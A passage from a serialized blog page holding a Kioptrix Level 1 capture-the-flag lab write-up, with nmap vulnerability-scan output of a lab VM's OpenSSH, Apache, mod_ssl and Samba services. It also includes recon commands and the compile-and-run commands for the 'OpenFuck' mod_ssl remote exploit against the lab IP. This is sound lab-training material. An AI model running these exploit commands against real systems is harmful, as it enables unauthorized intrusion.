10.0    https://vulners.com/cve/CVE-2002-0640\n|       CVE-2002-0639   10.0    https://vulners.com/cve/CVE-2002-0639\n|       CVE-2002-0083   10.0    https://vulners.com/cve/CVE-2002-0083\n|       CVE-2011-2895   9.3     https://vulners.com/cve/CVE-2011-2895\n|       CVE-2006-5051   9.3     https://vulners.com/cve/CVE-2006-5051\n|       CVE-2006-4924   7.8     https://vulners.com/cve/CVE-2006-4924\n|       CVE-2003-1562   7.6     https://vulners.com/cve/CVE-2003-1562\n|       CVE-2010-4478   7.5     https://vulners.com/cve/CVE-2010-4478\n|       CVE-2002-0575   7.5     https://vulners.com/cve/CVE-2002-0575\n|       CVE-2001-1459   7.5     https://vulners.com/cve/CVE-2001-1459\n|       CVE-2001-1380   7.5     https://vulners.com/cve/CVE-2001-1380\n|       CVE-2001-0816   7.5     https://vulners.com/cve/CVE-2001-0816\n|       SECURITYVULNS:VULN:1956 7.2     https://vulners.com/securityvulns/SECURITYVULNS:VULN:1956\n|       CVE-2001-0529   7.2     https://vulners.com/cve/CVE-2001-0529\n|       SSV:64479       5.0     https://vulners.com/seebug/SSV:64479    *EXPLOIT*\n|       SSV:6192        5.0     https://vulners.com/seebug/SSV:6192     *EXPLOIT*\n|       SSV:60656       5.0     https://vulners.com/seebug/SSV:60656    *EXPLOIT*\n|       SSV:16847       5.0     https://vulners.com/seebug/SSV:16847    *EXPLOIT*\n|       PACKETSTORM:73600       5.0     https://vulners.com/packetstorm/PACKETSTORM:73600       *EXPLOIT*\n|       PACKETSTORM:54435       5.0     https://vulners.com/packetstorm/PACKETSTORM:54435       *EXPLOIT*\n|       EXPLOITPACK:63CFD85A8DA29BF22328E65C685CBBA3    5.0     https://vulners.com/exploitpack/EXPLOITPACK:63CFD85A8DA29BF22328E65C685CBBA3    *EXPLOIT*\n|       EDB-ID:3303     5.0     https://vulners.com/exploitdb/EDB-ID:3303       *EXPLOIT*\n|       CVE-2010-5107   5.0     https://vulners.com/cve/CVE-2010-5107\n|       CVE-2007-2243   5.0     https://vulners.com/cve/CVE-2007-2243\n|       CVE-2006-5052   5.0     https://vulners.com/cve/CVE-2006-5052\n|       SSV:66339       4.9     https://vulners.com/seebug/SSV:66339    *EXPLOIT*\n|       SSV:10777       4.9     https://vulners.com/seebug/SSV:10777    *EXPLOIT*\n|       EXPLOITPACK:B5E7D30E7583980F37EF6DBC0B05FBC3    4.9     https://vulners.com/exploitpack/EXPLOITPACK:B5E7D30E7583980F37EF6DBC0B05FBC3    *EXPLOIT*\n|       EDB-ID:8163     4.9     https://vulners.com/exploitdb/EDB-ID:8163       *EXPLOIT*\n|       CVE-2009-0537   4.9     https://vulners.com/cve/CVE-2009-0537\n|       CVE-2012-0814   3.5     https://vulners.com/cve/CVE-2012-0814\n|       CVE-2011-4327   2.1     https://vulners.com/cve/CVE-2011-4327\n|       CVE-2008-3259   1.2     https://vulners.com/cve/CVE-2008-3259\n|       SECURITYVULNS:VULN:1953 0.0     https://vulners.com/securityvulns/SECURITYVULNS:VULN:1953\n|       SECURITYVULNS:VULN:1608 0.0     https://vulners.com/securityvulns/SECURITYVULNS:VULN:1608\n|       SECURITYVULNS:VULN:1499 0.0     https://vulners.com/securityvulns/SECURITYVULNS:VULN:1499\n|       SECURITYVULNS:VULN:1488 0.0     https://vulners.com/securityvulns/SECURITYVULNS:VULN:1488\n|       SECURITYVULNS:VULN:1474 0.0     https://vulners.com/securityvulns/SECURITYVULNS:VULN:1474\n|       SECURITYVULNS:VULN:1439 0.0     https://vulners.com/securityvulns/SECURITYVULNS:VULN:1439\n|       SECURITYVULNS:VULN:1344 0.0     https://vulners.com/securityvulns/SECURITYVULNS:VULN:1344\n|       SECURITYVULNS:VULN:1262 0.0     https://vulners.com/securityvulns/SECURITYVULNS:VULN:1262\n|_      SECURITYVULNS:VULN:1233 0.0     https://vulners.com/securityvulns/SECURITYVULNS:VULN:1233\n80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)\n| http-enum: \n|   /test.php: Test page\n|   /icons/: Potentially interesting directory w/ listing on &#39;apache/1.3.20&#39;\n|   /manual/: Potentially interesting directory w/ listing on &#39;apache/1.3.20&#39;\n|_  /usage/: Potentially interesting folder\n|_http-stored-xss: Couldn&#39;t find any stored XSS vulnerabilities.\n|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b\n|_http-trace: TRACE is enabled\n|_http-dombased-xss: Couldn&#39;t find any DOM based XSS.\n|_http-csrf: Couldn&#39;t find any CSRF vulnerabilities.\n111/tcp  open  rpcbind     2 (RPC #100000)\n| rpcinfo: \n|   program version    port/proto  service\n|   100000  2            111/tcp   rpcbind\n|   100000  2            111/udp   rpcbind\n|   100024  1           1024/tcp   status\n|_  100024  1           1024/udp   status\n139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)\n443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b\n| ssl-dh-params: \n|   VULNERABLE:\n|   Transport Layer Security (TLS) Protocol DHE_EXPORT Ciphers Downgrade MitM (Logjam)\n|     State: VULNERABLE\n|     IDs:  BID:74733  CVE:CVE-2015-4000\n|       The Transport Layer Security (TLS) protocol contains a flaw that is\n|       triggered when handling Diffie-Hellman key exchanges defined with\n|       the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker\n|       to downgrade the security of a TLS session to 512-bit export-grade\n|       cryptography, which is significantly weaker, allowing the attacker\n|       to more easily break the encryption and monitor or tamper with\n|       the encrypted stream.\n|     Disclosure date: 2015-5-19\n|     Check results:\n|       EXPORT-GRADE DH GROUP 1\n|             Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA\n|             Modulus Type: Safe prime\n|             Modulus Source: mod_ssl 2.0.x/512-bit MODP group with safe prime modulus\n|             Modulus Length: 512\n|             Generator Length: 8\n|             Public Key Length: 512\n|     References:\n|       https://weakdh.org\n|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000\n|       https://www.securityfocus.com/bid/74733\n|   \n|   Diffie-Hellman Key Exchange Insufficient Group Strength\n|     State: VULNERABLE\n|       Transport Layer Security (TLS) services that use Diffie-Hellman groups\n|       of insufficient strength, especially those using one of a few commonly\n|       shared groups, may be susceptible to passive eavesdropping attacks.\n|     Check results:\n|       WEAK DH GROUP 1\n|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA\n|             Modulus Type: Safe prime\n|             Modulus Source: mod_ssl 2.0.x/1024-bit MODP group with safe prime modulus\n|             Modulus Length: 1024\n|             Generator Length: 8\n|             Public Key Length: 1024\n|     References:\n|_      https://weakdh.org\n|_http-dombased-xss: Couldn&#39;t find any DOM based XSS.\n| ssl-ccs-injection: \n|   VULNERABLE:\n|   SSL/TLS MITM vulnerability (CCS Injection)\n|     State: VULNERABLE\n|     Risk factor: High\n|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h\n|       does not properly restrict processing of ChangeCipherSpec messages,\n|       which allows man-in-the-middle attackers to trigger use of a zero\n|       length master key in certain OpenSSL-to-OpenSSL communications, and\n|       consequently hijack sessions or obtain sensitive information, via\n|       a crafted TLS handshake, aka the \&quot;CCS Injection\&quot; vulnerability.\n|           \n|     References:\n|       http://www.openssl.org/news/secadv_20140605.txt\n|       http://www.cvedetails.com/cve/2014-0224\n|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224\n|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b\n|_http-csrf: Couldn&#39;t find any CSRF vulnerabilities.\n| ssl-poodle: \n|   VULNERABLE:\n|   SSL POODLE information leak\n|     State: VULNERABLE\n|     IDs:  BID:70574  CVE:CVE-2014-3566\n|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other\n|           products, uses nondeterministic CBC padding, which makes it easier\n|           for man-in-the-middle attackers to obtain cleartext data via a\n|           padding-oracle attack, aka the \&quot;POODLE\&quot; issue.\n|     Disclosure date: 2014-10-14\n|     Check results:\n|       TLS_RSA_WITH_3DES_EDE_CBC_SHA\n|     References:\n|       https://www.openssl.org/~bodo/ssl-poodle.pdf\n|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566\n|       https://www.imperialviolet.org/2014/10/14/poodle.html\n|_      https://www.securityfocus.com/bid/70574\n|_http-stored-xss: Couldn&#39;t find any stored XSS vulnerabilities.\n|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)\n|_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)\n|_sslv2-drown: ERROR: Script execution failed (use -d to debug)\n1024/tcp open  status      1 (RPC #100024)\nMAC Address: 00:0C:29:7C:3A:16 (VMware)\n\nHost script results:\n| smb-vuln-cve2009-3103: \n|   VULNERABLE:\n|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)\n|     State: VULNERABLE\n|     IDs:  CVE:CVE-2009-3103\n|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,\n|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a\n|           denial of service (system crash) via an &amp; (ampersand) character in a Process ID High header field in a NEGOTIATE\n|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,\n|           aka \&quot;SMBv2 Negotiation Vulnerability.\&quot;\n|           \n|     Disclosure date: 2009-09-08\n|     References:\n|       http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103\n|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103\n|_smb-vuln-ms10-054: false\n|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: ERROR: Server returned less data than it was supposed to (one or more fields are missing); aborting [14]\n|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: ERROR: Server returned less data than it was supposed to (one or more fields are missing); aborting [14]\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 356.82 seconds`&quot;],&quot;filePath&quot;:[0,&quot;source/posts/Reproduction/Kioptrix level 1.md&quot;],&quot;assetImports&quot;:[1,[[0,&quot;img/1679306030928.png&quot;],[0,&quot;img/1679366939593.png&quot;],[0,&quot;img/1679366949376.png&quot;],[0,&quot;img/1679366954478.png&quot;],[0,&quot;img/1678960944499.png&quot;],[0,&quot;img/1678960950947.png&quot;]]],&quot;digest&quot;:[0,&quot;f2d5afa6b934df10&quot;],&quot;rendered&quot;:[0,{&quot;html&quot;:[0,&quot;&lt;h1 id=\&quot;information-gathering\&quot;&gt;Information gathering&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#information-gathering\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;netdiscover -r 192.168.124.0/24&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap -Pn -T4 -sV -O 192.168.124.140 -p-&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap --script vuln 192.168.124.140 -p-&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;dirb http://192.168.124.140 /usr/share/wordlists/dirb/big.txt&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;method-1--samba\&quot;&gt;Method-1  Samba&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#method-1--samba\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1679306030928.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\nAttentions please,meterpreter is not availiable\nIt’s root.There is no need to escalate privilege.&lt;p&gt;&lt;/p&gt;\n&lt;h1 id=\&quot;method-2-openfuck-mod_ssl-vulnerability\&quot;&gt;Method-2 OpenFuck mod_ssl vulnerability&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#method-2-openfuck-mod_ssl-vulnerability\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;searchsploit mod_ssl 2.8.4&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1679366939593.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;searchsploit -p 47080&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1679366949376.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1679366954478.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\nWe need install libssl-dev first.&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;gcc -o OpenFuck 47080.c -lcrypto&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;./OpenFuck&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;./OpenFuck 0x6b 192.168.124.140 443 -c 40&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;There are some errors in compile process.&lt;/p&gt;\n&lt;h1 id=\&quot;enclosure\&quot;&gt;Enclosure&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#enclosure\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1678960944499.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1678960950947.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\n`Nmap scan report for bogon (192.168.124.140)\nHost is up (0.0021s latency).\nNot shown: 65529 closed tcp ports (reset)\nPORT     STATE SERVICE     VERSION\n22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)\n| vulners:\n|   cpe:/a:openbsd:openssh:2.9p2:\n|       CVE-2002-0640   10.0    &lt;a href=\&quot;https://vulners.com/cve/CVE-2002-0640\&quot;&gt;https://vulners.com/cve/CVE-2002-0640&lt;/a&gt;\n|       CVE-2002-0639   10.0    &lt;a href=\&quot;https://vulners.com/cve/CVE-2002-0639\&quot;&gt;https://vulners.com/cve/CVE-2002-0639&lt;/a&gt;\n|       CVE-2002-0083   10.0    &lt;a href=\&quot;https://vulners.com/cve/CVE-2002-0083\&quot;&gt;https://vulners.com/cve/CVE-2002-0083&lt;/a&gt;\n|       CVE-2011-2895   9.3     &lt;a href=\&quot;https://vulners.com/cve/CVE-2011-2895\&quot;&gt;https://vulners.com/cve/CVE-2011-2895&lt;/a&gt;\n|       CVE-2006-5051   9.3     &lt;a href=\&quot;https://vulners.com/cve/CVE-2006-5051\&quot;&gt;https://vulners.com/cve/CVE-2006-5051&lt;/a&gt;\n|       CVE-2006-4924   7.8     &lt;a href=\&quot;https://vulners.com/cve/CVE-2006-4924\&quot;&gt;https://vulners.com/cve/CVE-2006-4924&lt;/a&gt;\n|       CVE-2003-1562   7.6     &lt;a href=\&quot;https://vulners.com/cve/CVE-2003-1562\&quot;&gt;https://vulners.com/cve/CVE-2003-1562&lt;/a&gt;\n|       CVE-2010-4478   7.5     &lt;a href=\&quot;https://vulners.com/cve/CVE-2010-4478\&quot;&gt;https://vulners.com/cve/CVE-2010-4478&lt;/a&gt;\n|       CVE-2002-0575   7.5     &lt;a href=\&quot;https://vulners.com/cve/CVE-2002-0575\&quot;&gt;https://vulners.com/cve/CVE-2002-0575&lt;/a&gt;\n|       CVE-2001-1459   7.5     &lt;a href=\&quot;https://vulners.com/cve/CVE-2001-1459\&quot;&gt;https://vulners.com/cve/CVE-2001-1459&lt;/a&gt;\n|       CVE-2001-1380   7.5     &lt;a href=\&quot;https://vulners.com/cve/CVE-2001-1380\&quot;&gt;https://vulners.com/cve/CVE-2001-1380&lt;/a&gt;\n|       CVE-2001-0816   7.5     &lt;a href=\&quot;https://vulners.com/cve/CVE-2001-0816\&quot;&gt;https://vulners.com/cve/CVE-2001-0816&lt;/a&gt;\n|       SECURITYVULNS:VULN:1956 7.2     &lt;a href=\&quot;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1956\&quot;&gt;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1956&lt;/a&gt;\n|       CVE-2001-0529   7.2     &lt;a href=\&quot;https://vulners.com/cve/CVE-2001-0529\&quot;&gt;https://vulners.com/cve/CVE-2001-0529&lt;/a&gt;\n|       SSV:64479       5.0     &lt;a href=\&quot;https://vulners.com/seebug/SSV:64479\&quot;&gt;https://vulners.com/seebug/SSV:64479&lt;/a&gt;    &lt;em&gt;EXPLOIT&lt;/em&gt;\n|       SSV:6192        5.0     &lt;a href=\&quot;https://vulners.com/seebug/SSV:6192\&quot;&gt;https://vulners.com/seebug/SSV:6192&lt;/a&gt;     &lt;em&gt;EXPLOIT&lt;/em&gt;\n|       SSV:60656       5.0     &lt;a href=\&quot;https://vulners.com/seebug/SSV:60656\&quot;&gt;https://vulners.com/seebug/SSV:60656&lt;/a&gt;    &lt;em&gt;EXPLOIT&lt;/em&gt;\n|       SSV:16847       5.0     &lt;a href=\&quot;https://vulners.com/seebug/SSV:16847\&quot;&gt;https://vulners.com/seebug/SSV:16847&lt;/a&gt;    &lt;em&gt;EXPLOIT&lt;/em&gt;\n|       PACKETSTORM:73600       5.0     &lt;a href=\&quot;https://vulners.com/packetstorm/PACKETSTORM:73600\&quot;&gt;https://vulners.com/packetstorm/PACKETSTORM:73600&lt;/a&gt;       &lt;em&gt;EXPLOIT&lt;/em&gt;\n|       PACKETSTORM:54435       5.0     &lt;a href=\&quot;https://vulners.com/packetstorm/PACKETSTORM:54435\&quot;&gt;https://vulners.com/packetstorm/PACKETSTORM:54435&lt;/a&gt;       &lt;em&gt;EXPLOIT&lt;/em&gt;\n|       EXPLOITPACK:63CFD85A8DA29BF22328E65C685CBBA3    5.0     &lt;a href=\&quot;https://vulners.com/exploitpack/EXPLOITPACK:63CFD85A8DA29BF22328E65C685CBBA3\&quot;&gt;https://vulners.com/exploitpack/EXPLOITPACK:63CFD85A8DA29BF22328E65C685CBBA3&lt;/a&gt;    &lt;em&gt;EXPLOIT&lt;/em&gt;\n|       EDB-ID:3303     5.0     &lt;a href=\&quot;https://vulners.com/exploitdb/EDB-ID:3303\&quot;&gt;https://vulners.com/exploitdb/EDB-ID:3303&lt;/a&gt;       &lt;em&gt;EXPLOIT&lt;/em&gt;\n|       CVE-2010-5107   5.0     &lt;a href=\&quot;https://vulners.com/cve/CVE-2010-5107\&quot;&gt;https://vulners.com/cve/CVE-2010-5107&lt;/a&gt;\n|       CVE-2007-2243   5.0     &lt;a href=\&quot;https://vulners.com/cve/CVE-2007-2243\&quot;&gt;https://vulners.com/cve/CVE-2007-2243&lt;/a&gt;\n|       CVE-2006-5052   5.0     &lt;a href=\&quot;https://vulners.com/cve/CVE-2006-5052\&quot;&gt;https://vulners.com/cve/CVE-2006-5052&lt;/a&gt;\n|       SSV:66339       4.9     &lt;a href=\&quot;https://vulners.com/seebug/SSV:66339\&quot;&gt;https://vulners.com/seebug/SSV:66339&lt;/a&gt;    &lt;em&gt;EXPLOIT&lt;/em&gt;\n|       SSV:10777       4.9     &lt;a href=\&quot;https://vulners.com/seebug/SSV:10777\&quot;&gt;https://vulners.com/seebug/SSV:10777&lt;/a&gt;    &lt;em&gt;EXPLOIT&lt;/em&gt;\n|       EXPLOITPACK:B5E7D30E7583980F37EF6DBC0B05FBC3    4.9     &lt;a href=\&quot;https://vulners.com/exploitpack/EXPLOITPACK:B5E7D30E7583980F37EF6DBC0B05FBC3\&quot;&gt;https://vulners.com/exploitpack/EXPLOITPACK:B5E7D30E7583980F37EF6DBC0B05FBC3&lt;/a&gt;    &lt;em&gt;EXPLOIT&lt;/em&gt;\n|       EDB-ID:8163     4.9     &lt;a href=\&quot;https://vulners.com/exploitdb/EDB-ID:8163\&quot;&gt;https://vulners.com/exploitdb/EDB-ID:8163&lt;/a&gt;       &lt;em&gt;EXPLOIT&lt;/em&gt;\n|       CVE-2009-0537   4.9     &lt;a href=\&quot;https://vulners.com/cve/CVE-2009-0537\&quot;&gt;https://vulners.com/cve/CVE-2009-0537&lt;/a&gt;\n|       CVE-2012-0814   3.5     &lt;a href=\&quot;https://vulners.com/cve/CVE-2012-0814\&quot;&gt;https://vulners.com/cve/CVE-2012-0814&lt;/a&gt;\n|       CVE-2011-4327   2.1     &lt;a href=\&quot;https://vulners.com/cve/CVE-2011-4327\&quot;&gt;https://vulners.com/cve/CVE-2011-4327&lt;/a&gt;\n|       CVE-2008-3259   1.2     &lt;a href=\&quot;https://vulners.com/cve/CVE-2008-3259\&quot;&gt;https://vulners.com/cve/CVE-2008-3259&lt;/a&gt;\n|       SECURITYVULNS:VULN:1953 0.0     &lt;a href=\&quot;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1953\&quot;&gt;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1953&lt;/a&gt;\n|       SECURITYVULNS:VULN:1608 0.0     &lt;a href=\&quot;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1608\&quot;&gt;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1608&lt;/a&gt;\n|       SECURITYVULNS:VULN:1499 0.0     &lt;a href=\&quot;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1499\&quot;&gt;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1499&lt;/a&gt;\n|       SECURITYVULNS:VULN:1488 0.0     &lt;a href=\&quot;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1488\&quot;&gt;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1488&lt;/a&gt;\n|       SECURITYVULNS:VULN:1474 0.0     &lt;a href=\&quot;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1474\&quot;&gt;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1474&lt;/a&gt;\n|       SECURITYVULNS:VULN:1439 0.0     &lt;a href=\&quot;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1439\&quot;&gt;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1439&lt;/a&gt;\n|       SECURITYVULNS:VULN:1344 0.0     &lt;a href=\&quot;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1344\&quot;&gt;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1344&lt;/a&gt;\n|       SECURITYVULNS:VULN:1262 0.0     &lt;a href=\&quot;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1262\&quot;&gt;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1262&lt;/a&gt;\n|_      SECURITYVULNS:VULN:1233 0.0     &lt;a href=\&quot;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1233\&quot;&gt;https://vulners.com/securityvulns/SECURITYVULNS:VULN:1233&lt;/a&gt;\n80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)\n| http-enum:\n|   /test.php: Test page\n|   /icons/: Potentially interesting directory w/ listing on ‘apache/1.3.20’\n|   /manual/: Potentially interesting directory w/ listing on ‘apache/1.3.20’\n|_  /usage/: Potentially interesting folder\n|_http-stored-xss: Couldn’t find any stored XSS vulnerabilities.\n|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b\n|_http-trace: TRACE is enabled\n|&lt;em&gt;http-dombased-xss: Couldn’t find any DOM based XSS.\n|&lt;em&gt;http-csrf: Couldn’t find any CSRF vulnerabilities.\n111/tcp  open  rpcbind     2 (RPC #100000)\n| rpcinfo:\n|   program version    port/proto  service\n|   100000  2            111/tcp   rpcbind\n|   100000  2            111/udp   rpcbind\n|   100024  1           1024/tcp   status\n|&lt;/em&gt;  100024  1           1024/udp   status\n139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)\n443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b\n| ssl-dh-params:\n|   VULNERABLE:\n|   Transport Layer Security (TLS) Protocol DHE_EXPORT Ciphers Downgrade MitM (Logjam)\n|     State: VULNERABLE\n|     IDs:  BID:74733  CVE:CVE-2015-4000\n|       The Transport Layer Security (TLS) protocol contains a flaw that is\n|       triggered when handling Diffie-Hellman key exchanges defined with\n|       the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker\n|       to downgrade the security of a TLS session to 512-bit export-grade\n|       cryptography, which is significantly weaker, allowing the attacker\n|       to more easily break the encryption and monitor or tamper with\n|       the encrypted stream.\n|     